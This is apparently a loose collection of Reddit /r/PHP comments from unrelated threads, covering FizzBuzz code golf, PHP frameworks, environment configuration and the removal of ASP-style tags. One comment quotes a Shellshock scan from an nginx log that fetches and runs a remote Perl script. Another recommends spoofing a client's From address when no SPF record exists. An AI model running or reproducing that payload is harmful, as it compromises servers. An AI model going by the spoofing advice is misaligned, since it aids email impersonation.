That is fine providing domainA.com doesnt have a SPF record. Check the SPF record here for domainA.com http://www.kitterman.com/spf/validate.html Options. 1. If domainA.com doesnt have a SPF record, go for it, spoof the from address of domaina.com and emails will work find (just did this exact thing this week and over 2000 emails, no change in deliverabilty) they all got through as client does not have a SPF record. 2. If they do have a SPF record, ask them to add domainb.com? 3. If the fails, ask to send emails via their SMPT server. 4. If that fails, you have to use a from address that is like email@domainb.com if you don't, most email providers will just delete your email as a spoofing attempt. And your email will never get through. 5. You can always set the replyto address of the email as someemail@domaina.com this wont affect deliverablity. Use Mandrill for email, its darn good and one of the best priced. Mailgun is actually quite expensive after the first 10K emails. 
If you ask which framework people will mention their favorite frameworks and choosing from their favorites will be again difficult :-) . I will agree with many of the people especially with /u/Nilithus asking you to checkout the components than looking at framework. I have started with aura (~2011) with only one aim in mind, to learn the inner workings of a framework and later becoming one of the contributors. It is for /u/pmjones I am still there. If you love packages you can choose one and use it or use the [framework](https://github.com/auraphp/Aura.Web_Project/) which is built on top of 4 standalone components [aura/router](https://github.com/auraphp/Aura.Router/), [aura/dispatcher](https://github.com/auraphp/Aura.Dispatcher/), [aura/di](https://github.com/auraphp/Aura.Di/), [aura/web](https://github.com/auraphp/Aura.Web/) and [monolog](https://github.com/Seldaek/monolog). You can always use its components inside other frameworks like [Slim](http://harikt.com/blog/2014/09/02/aura-input-form-inside-slim-framework/), or even [integrate with Plates](http://harikt.com/blog/2014/05/13/extending-plates-with-aura-html-helpers/). That said I do like other frameworks, and have been digging many of the code to learn myself. But I do keep some preferences 1. Composer support 1. Following PSR-2 standard 1. Semversion is nice to have I do like Zend Framework and Symfony components. And have also integrated those with the help of composer. For small applications microframework is nice, but when your application grows I don't like keeping every routes on a single file with the microframework approach ( May be there are different ways for different people ). That is one more reason you should look aura, for it can act as a micro, but can be expanded to architectural changes due to the power of the dispatcher. Consider spending 3 minutes reading [Refactoring To Architecture Changes](https://github.com/auraphp/Aura.Dispatcher#refactoring-to-architecture-changes) even if you are not using it. Thank you
Sorry about the wall of text but I am completely lost here...
This is the sort of thing I like to do. Annoyingly, I can't seem to beat 76 characters :(
Here is a 70 character one: while($i&lt;100)echo((++$i%15?($i%5?($i%3?$i:fizz):buzz):fizzbuzz)."\n"); In PHP you can omit quotes
57 characters, ignoring warnings and removing quotes and parens: while($i&lt;100)echo++$i%15?$i%5?$i%3?$i:fizz:buzz:fizzbuzz; You have to be careful with no parens in php, [due to this bug](http://phpsadness.com/sad/30) - but in this case, it works. One with no warnings at 68: $i=0;while($i&lt;100)echo++$i%15?$i%5?$i%3?$i:'fizz':'buzz':'fizzbuzz';
With `error_reporting(0);` you can do it in [54 characters](https://github.com/kt3k/fizzbuzz/blob/master/php/short.php)
You forgot the newlines, so that would add a few chars. But congrats on stacking ternary operators in PHP, their associativity sucks
phalcon ... as far as i know it can handle more requests per second then any other framework for APIs, it was at least faster then laravel for us by a significant amount of rqps [for pure rest api usage] if you dont have thousands of requests every second, the difference wont matter for you though - we are speaking of peak rqps from over 100.000 - in that case i would chose whatever has the fastest time to market for you, i.e. ask your devs what they already know ... for us this would be laravel 
did you consider just using SMTP ? then you can send for whatever domain the smtp server can send emails for
69 characters... for(;$i++&lt;100;)echo$i%15?$i%5?$i%3?$i:'Fizz':'Buzz':'FizzBuzz',"\n";
Elephants mouth?
Another vote for Silex!
I have absolutely no idea, I just copy pasted it, looks like gibberish to me.
`while($i++&lt;100)echo[Fizz][$i%3].[Buzz][$i%5]?:$i,"\n";` 54 chars, with notices.
This is a totally fair question. The short answer is that [Separated Presentation](http://martinfowler.com/eaaDev/SeparatedPresentation.html) is nothing new, although it is not always thoroughly applied. If you'll bear with a longish answer ... &gt; the responder part, ... doesn't document current practice; it advocates something new. I get this, and I even partly agree with it. Common MVC practice regards the Template as the View, and not the Response as the view. I assert that this stems from a misunderstanding of where the separation ought to be based on a flawed inheritance of Model-View-Controller. We already believe in the idea of [Separated Presentation](http://martinfowler.com/eaaDev/SeparatedPresentation.html). The ADR pattern establishes a stronger separation based on the idea that the Response is the View. If we look at it that way, it's not something new; it's something old and established, but applied more rigorously. Having said that, I still get where you're coming from. Few people actually *do* that, but that's because they're not thinking about it in "the right way" (if you'll pardon the phrasing there). Once they begin thinking about the Response as the View, it becomes as natural to have a Responder for the Response as it is natural to have a Template for HTML (instead of embedding HTML in a Controller or a Model). So in a way it's nothing new; it's the same old concept (Separated Presentation) applied in a new context. &gt; Is it more flexible? As flexible as using a Template system for HTML. &gt; Can we use the same responder for multiple actions? Sure. Depending on how you write the Responder, the same way you might be able to use the same Template in different controller methods. &gt; can an action interchangeably use one of several responders? If you mean "can a single action choose from different responders based on some logic in the action?" then I assert the answer is "it should not do that". The Action should not be in charge of presentation logic. The Action is dumb: it takes input, passes that input to the Domain, takes the output and passes it to the Responder, and the *Responder* chooses how to do the presentation. &gt; is the code easier to read and understand when it's factored into action/responder? *I* think it is, but (as you say) that might just be personal preference. (Let's put it this way: is the code easier to read and understand when the HTML is factored out to a Template?) Hope that helps. 
Nice, I'll have to check that out again. You remember if it's still has a package for Laravel?
&gt; just print the number Your solution does not take into account this requirement.
You're absolutely correct. They should **not** be in the controller (when you're talking about MVC at least). They should be in a presentational layer. Some people would call it a View. But MVC itself isn't really healthy to talk about, which is why I say "presentation layer". It handles things like determining which format to render in, and rendering appropriately. Why people assume that if it's not in the template it must be in the controller is beyond me...
A template != a view. A view is an abstraction. A template is an implementation. 
I never understood why people do 3 "if", when you can make only 2: while ($i&lt;100) { if ($i % 3 == 0) echo "Fizz"; if ($i % 5 == 0) echo "Buzz"; echo "\n"; }
Let's not go jumping to things just yet. Just because the highly publicized RFC debacle where PHP 7 was named the next version happened, doesn't mean PHP 6 isn't doable. I'm sure the team can work both in for release at the same time. PHPNG, who knows. That stuff is in the PHP 7 master branch now, but could be removed at any moment it is so unstable. tl;dr - The PHP team can surely focus there effort in 3 different directions at once and release loads of new code without worry. (This is pure sarcasm in case it doesn't come off while reading.) 
[FOSRestBundle](https://github.com/FriendsOfSymfony/FOSRestBundle) [FOSJsRoutingBundle ](https://github.com/FriendsOfSymfony/FOSJsRoutingBundle) [Nelmio](http://nelm.io/)
We could use some more folks from PHP in the /r/drupal do shamelessly crossposting a link to my comment over there :) http://www.reddit.com/r/drupal/comments/2hz2hx/drupal_8_beta_1_just_got_tagged/
&gt; PHPNG, who knows. That stuff is in the PHP 7 master branch now, but could be removed at any moment it is so unstable. Not sure where you got the idea that PHPNG is unstable... Right now the master branch is prep work for the next major release which means it's more unstable than normal regardless of PHPNG changes. Could it be removed? Yeah... but I doubt it. I really doubt it.
TIL I've been using PHP longer than two of the creators of PHP.
Yeah, sorry, I should have checked /r/drupal first!
&gt; If none of those, just print the number. Because: *If none of those, just print the number.*
 use NilPortugues\SqlQueryBuilder\Builder\MySqlBuilder; use NilPortugues\SqlQueryBuilder\Builder\GenericBuilder; Is this for a Builder of some sort? Cause i'm not sure... use NilPortugues\SqlQuery\Builder\MySql; use NilPortugues\SqlQuery\Builder\Generic; Just saying...
https://packagist.org/packages/bkwld/laravel-haml I found that to be an excellent laravel wrapper for MtHaml. Install via composer and add the service provider as detailed in the README then you can render templates as normal. e.g: //parse and render app/views/index.haml.php View::make('index') 
They did say you could use whatever language you like. If you want to be absurdly pedantic and just piss everyone off, you could have won easily by inventing a new language. Call it 'fizzlang', and define it as having either a shorthand operator 'f' that executes fizzbuzz, or be an even bigger jerk and say its default behaviour on an empty script is to compute fizzbuzz. Your solution, coded in fizzlang, is now 0 characters.
hello newbie :) % / modulo operator returns the complete remainder of division, which is not zero or one ... but can be 2 3 4 etc ... so you should checl whether its 0 or NOT 0 :) also learn not bloating, like $Number = $Fnumber; why not just work on either $Fnumber or change $Fnumber = $_POST['Fnumber']; to $Number = $_POST['Fnumber'];
Not at all the shortest, but I've been trying to learn some functional stuff and I was bored so here... &lt;?php $zork = function($result, $mod) { return function($num)use($result, $mod) { return $num%$mod ? '' : $result; }; }; $fizz = $zork('Fizz', 3); $buzz = $zork('Buzz', 5); $spluge = function($fizz, $buzz) { return function($num)use($fizz, $buzz) { return $fizz($num) . $buzz($num) ?: $num; }; }; $fizzBuzz = $spluge($fizz, $buzz); $i = 0; while($i&lt;100) { echo $fizzBuzz($i) . "\n"; $i++; }; 
I made it to 65 on the same basic setup only to come see your nice clean version. while($i++&lt;100)echo(($i%3?'':'fizz').($i%5?'':'buzz')?:$i)."\n";
I think the modulo '%' operator truncates to int while [round](http://php.net/manual/en/function.round.php) will, well, round. 3.5 becomes 4, which is not what you performed a modulo operation on.
It's not a bug, it's doing exactly what the operator precedence table says it should be doing.
I'm standing by with my flamethrower ready to kill it with fire...
&gt; other things like the whole façade discussion Can you explain further what do you mean by this? I understand that using Facades is a controversial decision, but what is it about his posture that "bugs you"? Just curious
Can someone explain this syntax to someone like me who only knows PHP 5.4? (it doesn't compile in 5.4, I'm assuming this is a new shorthand syntax) 
Meh, new lines are overrated. I prefer old lines.
&gt;Aren't these articles edited? Bots! Likely, possibly. More and more blog posts are actually written by bots.
&gt; As for the last char, ~õ I guess that's a newline char code, but it's shown in github due to encoding problems? Notice the bitwise operator ~. That makes õ the newline character. Interesting hack. 
Oh wow, you're right :D 11110101 = õ 00001010 = LF (line feed) 
If redis had reliable delivery and the concept of the exchange, would there really be any advantage to the various mq systems? (I've admittedly not used them before if this question is stupid, sorry!) 
&gt; I've looked at Laravel and it seems simply amazing. My main concern is it might be moving too fast for us. Major version every single year, with breaking changes? This cools me down. I want to love it so much, but I just can't commit to it. I'm also hesitant because it seems to mainly be a one man show, with strong opinions. One thing Taylor has said in a [http://taylorotwell.com/looking-forward-laravel-4-2/](previous post) (before 4.2) is that he feels Laravel is more or less architecturally stable and won't be changing *that* much more in the future. Of course, 5 (previously 4.3) has some pretty significant changes, it's still the same basic architecture for most everything. I would assume that 5 is going to be the architectural plateau point for the framework.
What PHP version are you using?
Now THAT's what I'd expect from a programmer's interview, brilliant: You would have scored n+1 with me :-) (no really) - reading and understanding are often undervalued. The downside might be that you could be asked to explain your history with "fizzlang" (a language YOU LIKE)
http://restler3.luracast.com/
Yeah, but it sounds like you didn't care for Drupal in the first, so no loss. I am curious, what do you dislike about Symfony? I have some specific dislikes, for example the Command component is difficult to extend and the Security component is far too complex. But on the whole, I think Symfony and all the related stuff it has helped spawn (Composer and PSR to name two) have been very good things for the greater PHP community.
Environment handling. Here's what I consider NORMAL for environments: 1. You have a team of developers that each have one or MANY local environments for the same project. 2. You have one or more of central development, staging, release, or production environments 3. You DON'T want to have to maintain an environment manager or config each time you want to add a new environment, or make environments shared knowledge in a repo. 4. You want developers to be able to *easily* (changing one line of code, or using a command line command) switch between their local databases, and a shared remote database (for CMS-y stuff) 5. You want local environments to have common/default configs that can overridden easily WITHOUT committing those overrides into the repo, because that then no longer makes them local. 6. You don't want any credentials to make it into the repository. 7. You want developers to be able to have multiple local environments for experimentation and testing if needed I have yet to work with a framework that makes any of that easy or straight forward or does that right out of the box without adding a bunch of your own rules to .gitignore, and creating a bunch of template .EDITME files for configs.
&gt; use Symfony\Component\Security\Core\Authorization\AccessDecisionManager; \* bangs head on keyboard \* Composer is nice really nice, and PSR is good in theory, but in practice and the hands of most it turns into gently nudging people in the direction of writing overly abstracted code that makes me reminisce of late-90s corporate Java.
Explain why please. Our shop might give it a whirl with our next site that needs a CMS, but why use C5 as a framework?
I knew there were valid and well-thought-out opinions behind your sarcasm ;P Good points, though, and I agree. I think late-90s Java is a better place than early-00s PHP, though.
There is no comparison between Blade and Twig. If you look at the source code for Blade, it's basically a SUPER thin wrapper around PHP syntax. Twig is a full blown templating language. Blade has *just enough* functionality (extending, yielding, null catching) that it's useful for the majority of simple applications, but there is no question that Twig is more functionally capable, because Blade is not meant to be, *by design*.
more likely the author is not a native speaker and the bots were only used to upvote this post
I think ZF2 does this very eloquently by git ignoring *.local.php files and loading them last during bootstrap.
There are many ways you can achieve the URI piece you are talking about. If we are talking the display of a specific piece of content, the URL's can be overridden out-of-the-box on the content add/edit page. A contrib module called '[pathauto](http://drupal.org/project/pathauto)' helps if you want to automatically generate a URI per content type based on a pattern using tokens. If you aren't wanting to display a single piece of content, but multiple pieces of content(like say a list of news stories), you could use the views UI. Alternatively, you can create a custom module, and create the router item yourself which d8 now uses Symfony 2's Routing component. (This should be very similar to how you are doing it now). (https://www.drupal.org/node/2116767) As for content types. This is one of Drupal's strongest points. It's very easy to build content types with various field types. At the end of the day, if you are someone that leans towards doing things custom, I don't know if Drupal will add any value to you. I think d8 is a step in the right direction in terms of architectural decisions, but that doesn't change the fact that it's a large architecture that makes some assumptions about how you are going to use it, and to maximize it's use you still have to conquer a somewhat steep learning curve. 
It has advantages for both dev and cms user. Possibly a slightly difficult time to adopt it right now though as they're just releasing a new major version. (First non backwardly compatible one in 5 years).
RabbitMQ supports homogeneous clustering allowing you to transparently access queues on different machines, Redis cluster doesn't support PUB/SUB. Redis doesn't have fine grained access control, while RabbitMQ does. RabbitMQ has configurable queue backing engines, allowing you to mix and match persistence, durability etc. Mature fully fledged queue systems will always have benefits over Redis because they're years ahead in terms of catering to customers needs.
My team hacked something together for this exact purpose at a previous employer, which I wasn't happy with. I'll definitely think about a simple and elegant way to handle this. (Currently, all config is in commented JSON files with Twig templates to regenerate them on-the-fly.)
If I need to "get back to basics" so to speak, will I be able to leverage PSR-4 autoloading and maybe composer right out of the box with D8?
&gt; overly abstracted code that makes me reminisce of late-90s corporate Java I used to think this way, too. Then I started writing correctly-designed *unit* tests and discovered that abstraction and indirection were the only ways to actually correctly perform testing of individual units of code. It serves a purpose. It can be annoying as shit, but there are reasons for it.
Symfony handles this pretty well, i think, with the parameters file, and swappable environments....
Massive +1 Even using custom code, I still struggle to keep things clear enough, but also flexible enough. 
I know the feel, but a moment of realisation is having to add layers of abstraction or indirection that aren't seen by end-users or needlessly duplicating interfaces just to be able to test individual units of code. TL;DR if it's annoying as shit, you're doing it wrong.
And what should it be named? I read before that they are not really Facades, but as someone new to OOP concepts, I don't really know what to call them. I inspected the source and all they do is redirect a static call to a concrete instance.
Yeah sorry, I didn't read the submission and just used the standard fizzbuzz definition instead.
That's correct.
They're really the same length, because the `"\n"` can be replaced with the two character version here as well - I just didn't want to do it because it would result in invalid UTF-8, so copy&amp;paste wouldn't work right.
You shouldn't be using Drupal if you want to get that close to the basics. It is going to get in your way all the time, you stop being a PHP developer and become a Drupal developer. I use it a lot, but I started liking it when I stop fighting it and just did things the Drupal way. Drupal is not a framework and it's not a CMS, it's something in-between and things can get messy.
They are proxies. Theres been several large discussions about this, and IIRC the biggest is by /u/pmjones 
To be more precise, this happens when you do a static call, to a non-static method *from an incompatible context*. "Incompatible context" means that the `$this` variable in the called method will no longer satisfy `$this instanceof self` and can be some completely random object. Hopefully that clarifies that no sane code is affected by this :)
Here's a 35-character PHP solution: &lt;?php echo file_get_contents('b'); Of course, b's contents are literally as follows: 1 2 fizz 4 ... An 86-character actual solution: for($i=0;$i&lt;100;)echo"\n".(!(++$i%15)?'fizzbuzz':(!($i%5)?'buzz':(!($i%3)?'fizz':$i)))
Laravel 4 does this quite easily. I recently launched a project that was developed by 5 programmers across the globe, each with their own local environment. Additionally, we had a CI'd development environment (1 server), a staging environment (1 server) and a production environment (1 load balancer, 4 web servers, and 2 MySQL servers in a Master-Slave configuration where slave was read only and master was write only). Laravel enabled us to not have to worry about changing configs or updating configs as the way it handles environment configuration is absolutely elegant. 
When I was surveying crypto libraries in popular PHP frameworks for my BSides Orlando 2014 talk, Yii was one of the ones I looked at and didn't find any flaws in. Yii2 was even better.
Downvoted for accuracy. Business as usual in /r/php
To be clear, *using* the misnamed "facades" is not the core issue. Instead, it is that they are misnamed. The word Facade has a specific meaning in a software context, and that meaning is subverted in Laravel. The more proper term would be "Proxy", as in "static proxy to a service locator instance."
&gt; coed is potery
See, I disagree. I love Laravel, but I think it handles them poorly out of the box and is the primary motivation for my list above. For one, environment configuration is defined absolutely, rather than relatively. You have to define hosts that correspond to which environments in your start.php (or in Laravel 5, your bootstrap/environment.php) files. This is not how it should be. I should not be absolutely stating what is and isn't which enironment in a global / shared repository file. Environments should be *relative*, meaning each environment is technically a "local" environment. Then the project &amp; repo do not need to have any knowledge of what constitutes what environment. The second problem is laravel's "local" config folder is [not .gitignored](https://github.com/laravel/laravel/blob/master/.gitignore) by default. In fact, it shouldn't even exist by default, but [it does](https://github.com/laravel/laravel/tree/master/app/config/local). So this means if you *actually* want it to be local, you first have to `git rm --cached` it, then commit along with the ignore rule. The third major problem is that you cannot easily run multiple environments on your local, and switch between them out of the box (or use multiple credentials). Say I want to be able to switch between "local" and "development" environments so that I can use different database access credentials? I don't necessarily want any configs to change, I just want to use a different `.env.whatever.php` file. Just run `php artisan --env whatever` you say? Nope. That doesn't modify anything except for the current command line request, which is silly. If I want to test using staging database credentials instead of my local database credentials, I *SHOULD* be able to type `php artisan --env staging`, which mind you is still just a variation of a local environment (e.g. NOT in the repo, because they're private credentials that should be shared by some other means), but I can't. Or perhaps I have another local test environment that uses a different DB driver and maybe a different mail driver. Again, I can't switch to that easily and I have to make sure it's ignored in the gitignore. ***Here's how I would design environment handling:*** **Ships/clones with two root configuration folders:** * /config/shared * /config/private Shared is where all default configurations go. These are version controlled. Private is where you put any number of local-only environment configs &amp; credentials that will *override* what's in shared. These are not version controlled. One private environment might be called "local", another might be called "remote". Another might be called "testing-with-mandrill-and-postgres". It doesn't matter, it's up to you. You can have one private environment config directory or 30. Another team member might have one called "local" and another called "development" and yet another called "production". Everything in /config/private is git ignored by default, and exists ONLY to let you simulate a different environment whether that's truly local, or uses a remote database connection, or a different web service API key. **By default...** By DEFAULT it will use /configs/private/local as the overrides if they exist. If you create this and start overriding the config files &amp; array key values in `/config/shared`, then the framework will start using those without having to do anything else. Laravel does the environment config overriding, but it doesn't have a straight-forward way of knowing which environment to actually use (as outlined in my complaints above). **Switching between different local environments** Two ways: 1. a simple command line command: `$&gt; environment whatever`, Done. Maybe throw in some flags to differentiate between contexts like HTTP vs command line. 2. suppose you need more complex run-time environment switching, like using different API keys/service depending on where you traffic is coming from, or disabling certain functions depending on where you traffic is coming from etc. The framework would detect the presence of an `environment.php` file that implements an `EnvironmentDetection` interface. The file is gitignored for you, but the interface is part of the repo. This class would allow that particular machine to implement whatever environment switching logic it needs. **Deploying a new environment** Whether this is a new team member, or a new staging server, or a production server, all you have to do is create a /config/private/local folder and start overriding what is specific to that environment, and you're done. Maybe create an `environment.php` for more complex run-time switching if needed. It doesn't get any simpler, OR more flexible, than that. Currently, Laravel does not do anything like that out of the box, and I very much wish it did. 
Yea I saw a video about the new version, it's all drag and drop in the back end. 
can't we just add another layer to simplify everything? Symfony2 Laravel Edition - the framework for enterprise artisans
XDebug for local development. New Relic for staging and production.
PROTIP: You can trade off two more characters against an "Undefined constant" notice and use ~õ without quotes
Touché
Alright, so to get where I want to be when setting up a new laravel project (in Laravel 5) this is what I have to do: 1. add config/local to .gitignore 2. `git rm --cached config/local` 3. open up bootstrap/environment.php and tear out the default code it ships with, and replace it with return 'local' 4. Commit these changes 5. Modify my local configs with appropriate configs. Now I'm half-way there. But then I want to be able to use the database credentials for my staging server, but also be able to use my local credentials. To do this, I could just have a separate connections =&gt; mysql array commented out and just comment/uncomment the block as needed, but this is annoyingly cumbersome. I could create a separate environment folder called "staging" with the database.php file, but then not only do I need to remember to add this folder to git ignore, I have no actual way of switching to this environment without modifying bootstrap/environment.php to something more complex that looks for the presence of a *different* config file and maybe reads the first line out of it. Something *like* if (file_exists("../env.txt")) { return file_get_contents("../env.txt"); } else { return 'local'; } (this file-based appropriate is a little more portable than something like webserver environment variables) Fairly simple, but of course I also have to update .gitignore to ignore that env.txt file, and if I want a command-line way of switching the environment to update 'env.txt', I have to write that artisan command myself. FURTHER, because there is no parent 'private' folder, I have to add each new local environment I create to .gitignore, or write some more complex gitignore rules to allow everything that ships in /config by default (e.g.config/* !config/*.php !config/testing !config/packages or something like that, git ignore rules suck) So yes, you *can* do this in Laravel, but not out of the box. It requires boilerplate coding for each new laravel project you set up.
The slight issue with this is that it fails the test of index 0 printing "fizzbuzz", as your implicit 0 value of $i get incremented inside the loop. 
You could use a little sed with tail to chomp the opening datetime from the log lines. E.g. with a line like: [23-Sep-2014 12:48:58 UTC] PHP Notice: Undefined variable: This would do the trick (first one chomps a little more): tail -f /var/log/phperror | sed -re 's/^[^]]+[^:]+: +//' tail -f /var/log/phperror | sed -re 's/^[^]]+\] //' Since your log line contains a little more (PID/client) - you would need to modify those sed's to suit. And thanks for the heads up on ccze - not sure though it would still play ball piping into it after chomping the datetime/etc. from the log files.
An undocumented requirement is to prove that it runs. You'd have to write an interpreter for the language too, but that could be something that is "still in development", and simply prints the answer.
If you use Blade templates, you have agreed to adhere to that standard and convention. Mixing pure PHP in there is just shit practice to be frank. Then again, since we already established Blade is literally just PHP with some str_replace() to replace shit it doesn't matter. Use a real templating engine.
Well, Sublime Text is great to edit text. I have never used PHPStorm. I work with Netbeans and I use it for my Java and PHP projects. The difference between a text editor and an IDE is, the IDE is very helpful to code complete based on classes, inheritances, scope, etc. The result is productivity. I can code my Symfony and CakePHP apps with lots of help to make my code done, faster and with less time debugging. Don't get me wrong. I still use Notepad++ and Sublime to edit text bit, mostly, IDE to work.
During development you can just have it display errors (just be sure display errors is turned off on the live site). The only time display errors isn't sufficient is if you're doing AJAX type stuff where the output isn't immediately displayed. For that I'd recommend [Clockwork](https://github.com/itsgoingd/clockwork), which is also amazing for monitoring your database queries, cookies, and any useful debug info you want to output to it. 
I'm loving Yii.
Did someone not read the "pure sarcasm" disclosure?
Fair point. Fizzbuzz is canonically 1-100, so that's what I hacked it up for.
&gt; I log warnings and higher to Sentry I want to throw it out there that most (all?) of the Sentry code is open source at https://github.com/getsentry/sentry.
What do you propose? Also, this sounds like a great topic for the Framework Interop Group! https://github.com/php-fig/fig-standards/tree/master/proposed
down votes aside, your comment is pretty freaking awesome. i lol'd.
where can i see coeds in pottery? link please!
If you're going to cheat, "cat b" is far fewer characters.
Or, one third of the total set (79 functions).
So this means you can statically call a non-static method of your own class?
Wow, awesome. Can't wait!
This is what I use for environment detection in my projects: https://gist.github.com/adamwathan/10737348 If I need to switch environments, I just change the environment variable on the command line. Agreed that config/local should be ignored. Maybe it should ship with a local-example folder instead of a local folder to avoid having to remove the cached version from version control. For the staging stuff, I would just keep the staging environment under version control since it would be the same for everyone on the team, and use a .env.staging.php file to manage the credentials if you don't want them in the repo, since that file is ignored by default anyways. Not sure of a better solution for multiple local environments though, I guess I would just ignore each one. How many do you end up having?
[laracasts.com](https://laracasts.com/)
Ah true, didn't know the official problem started at 1. My bad.
https://pbs.twimg.com/media/By6EwlDIMAAVm6t.png:large The code will be public eventually, but for now you'll have to trust me that I implemented your suggestion ;) (The name of the framework is censored until my friend gets the LLC registered.)
This uses the new shorthand array syntax. This might give you a better idea on what is going on: $a = array('Fizz'); //or array(Fizz), does the same $b = array('Buzz'); while ($i++&lt;100) echo ($a[$i%3].$b[$i%5]) ? : $i,"\n"; $i % 3 outputs 0 if the number is evenly divisible by 3 (no remainder). Because our array only has one item ('Fizz' or 'Buzz' depending on the array), located at the key element 0, it will output. Then, the whole echo statement has a ternary operator. If it is not empty, it will return whatever Fizz or Buzz or FizzBuzz was given. If not, however, it will return the number ($i). Makes a little bit more sense?
I looked over some of the code and it is nice work, something could come of it. This is what I want my create controller and service to look like public function __invoke() { return $this-&gt;response($this-&gt;create($this-&gt;blog())); } public function create(array $data) { try { $blog = $this-&gt;newEntity($data); if (!$this-&gt;filter($blog)) { return $this-&gt;notValid($blog, $this-&gt;messages()); } if (!$this-&gt;create($blog)) { return $this-&gt;notCreated($blog); } return $this-&gt;created($blog); } catch (Exception $e) { return $this-&gt;error($e, $data); } } I'm assuming that payloads are being returned by the Service class and Responder is receiving, its just that it doesn't need to be so exposed. But traits might be a better alternative, since the controller can use the trait provided by that service (for their services). namespace ServiceDomain; class Service { public function add() { //domain logic } } trait ServiceTrait { protected $service; protected $response; protected function add($blog) { if (!$this-&gt;service-&gt;add($blog)) { $this-&gt;response-&gt;setErrorStatus(); } return $this-&gt;response; } } namespace Application; class Controller { use ServiceDomain\ServiceTrait; public function create($request) { return $this-&gt;add($this-&gt;blog($request-&gt;get('blog'))); } } 
Why did people want to keep these?
Not sure, check PHP version, maybe you have an old one that isn't decoding to an object? There is one problem though: array_push($basketQuantities[$i], $data-&gt;quantities[$i]); This is doing nothing but emitting warnings that you can't do that because `$basketQuantities[$i]` is not an array. I think you want: $basketQuantities[$i]=$data-&gt;quantities[$i]; Otherwise, you'd need to initialize `$basketQuantities[$i]` with an empty array, then change the part at the bottom where you are printing the quantity in the email to `$basketQuantities[$i][0]`
The issue doesn't appear to be in what's posted. You're not validating the response of json_decode. Check the net panel in your developer tools to make sure post is working. var_dump($data) would be useful to see. Also check other logic in your script. For instance, your loops don't handle empty arrays properly. for($i=0; $i&lt;= sizeof($products,0)-1; $i++){ These should either be foreach loops or ($i=0;$i&lt;sizeof($products,0); ... so empty arrays don't get touched.
The warnings are because he's referencing the wrong variables in his loops. For instance " sizeof($products,0)" when he's referencing "$data-&gt;quantities[$i]" and the $i=0; $i&lt;=sizeof so he'll always ask for index 0 even if it doesn't exist.
I have no idea why this got even one *No* let alone 8 from actual real people. 
&gt; The only benefit from Drupal is the massive number of free modules for it, though most of which are of varying quality. So the massive number of modules available is not a benefit? 
This page is kind of littered with spelling and grammatical errors. I'm at work now, but I'll document them for you tonight. 
And in particular rasmus :/
No they are beneficial then not having them, but after you get making them work the way that you want you often wish you had written them from scratch which in a simple framework would have been a similar amount of work. But again it depends on how picky your clients are...
Everyone is entitled to their own opinion. I think it's good to hear the thought process that went into the vote before criticizing it. It seems far to many developers these days jump on the same bandwagon.
here's the var_dump($data) http://pastebin.com/88g3CA76
if so, this will handle it: if ( $_SERVER['REQUEST_METHOD'] == 'POST' &amp;&amp; strpos($_SERVER['CONTENT_TYPE'], 'application/json') === 0 ) { $postdata = file_get_contents('php://input'); $_POST = json_decode($postdata, true); $_REQUEST = array_merge($_REQUEST, $_POST); } 
That is completely fair. I personally don't think we should keep them. But I do think most of the poeple voting on the RFC's have a fair bit of knowledge so I wouldn't dismiss it as supremely stupid.
A great cleanup :)
If you're on a mac, you can run console. It's a GUI tail program. When you initially open the program it follows a bunch of system logs, but you can have it open to a specific log file, really any text file. This is handy if your application uses something like Monolog. One of the benefits of this program over tail, it bounces whenever there is a new log.
Really? *sigh* http://www.sitepoint.com/tag/php56/ *shrug*
Maybe somebody, somewhere used them once upon a time, maybe they like the HTML-like script tag (reasons). I can't find an excuse for the asp tags. Indefensible.
Whats so bad about this style? 
from my nginx log ... bash bug scanning, trying to wget this perl script and run it: http://ellrich.com/legend.txt nginx_access.log:174.143.168.121 - - [02/Oct/2014:08:33:32 +0800] "GET /cgi-bin/bash HTTP/1.0" 404 54 "-" "() { :;}; /bin/bash -c \x22wget ellrich.com/legend.txt -O /tmp/.apache;killall -9 perl;perl /tmp/.apache;rm -rf /tmp/.apache\x22" "-"
&gt; I have yet to work with a framework that makes any of that easy or straight forward or does that right out of the box without adding a bunch of your own rules to .gitignore, and creating a bunch of template .EDITME files for configs. Symfony + composer. You get prompted on first install and a script writes the config file for you. You can easily use different front controllers to keep multiple environments in play on the same code base. It seems like you don't want to create templates, don't want to use config management and don't want to commit to code. There aren't really any other options until Google finishes inventing telepathic search. 
Didnt even see his vote. I'd love to see why he voted no.
Politics are stupid, no matter the experience.
Rasmus philosophy in code: `$vote = !$change;` 
The RFC in question: https://wiki.php.net/rfc/remove_alternative_php_tags
https://wiki.php.net/rfc/remove_alternative_php_tags read the reasoning section.
Umm, he was always *for* ugly solutions that work. Get the job done. He is not a frameworks, MVC, OOP and so guy.
Dev: xdebug, or simple tail -f in a terminal. Production: Logstash (Elasticsearch) + Kibana. Aggregates all servers logs into 1 place. Since I've been a nomad and don't have my 2+ monitor setup, I have a tablet and/or my 2nd laptop open with the logs open. 
Cheers i confused this with &lt;? 
 &lt;script language="php"&gt; echo "hello"; &lt;/script&gt; "**&amp;#3232;_&amp;#3232;**" was my reaction when I just tested this. 
Yea, its actually just asp tags. Why would anyone want to keep the asp tags? o.O
Yeah, I remember seeing him at PHP London admit he didn't see the point of getters and setters in objects 
Because it's pointless cruft. Something PHP has way too much of. 
This was fun yesterday - checking back today, I've seen some nice and small solutions! Do we get a booby prize for the most overkill solution? Without filling a text file with whitespace for example? &lt;?php class FizzBuzz { function __construct($rules = array(), $start = 1, $stop = 100){ for($i = $start; $i &lt;= $stop; $i++){ $output = ''; foreach($rules as $divisor=&gt;$term) if($i % $divisor == 0) $output .= $term; if(empty($output)) $output .= $i; echo $output."\n"; } } } $fizzbuzz = new FizzBuzz(array( 3 =&gt; 'Fizz', 5 =&gt; 'Buzz', ));
&gt; ಠ_ಠ Weird, it should just say 'hello'
This one is fun: &lt;script language='php'&gt; echo "hello"; ?&gt; &lt;?="hello"?&gt; &lt;?php echo "hello"; &lt;/script&gt;
It's nice to hear that PHP works even in such extreme heat ... good luck with the new conference ... and all the heat ...
There is an OO philosophy that says getters and setters are bad.
Someone out there has +10 years of experience in "client-side" PHP. 
I guess it's one thing less to worry about for those strange folks that found a reason to need eval().
I'm glad he gave us PHP and I'm glad he is no longer solely in charge of it. It is my assessment that he is not qualified to manage PHP, as blasphemous as that must sound, particularly to him.
Yes, that's right, see http://3v4l.org/sbTu3. Only the case where the `A::s()` call happens from an unrelated class (outside the inheritance hierarchy) you'll get the deprecation warning.
You can replace `echo file_get_contents` with `readfile`.
PHP is designed to run scripts that start and stop quickly, Node is designed to run applications in a loop indefinitely.
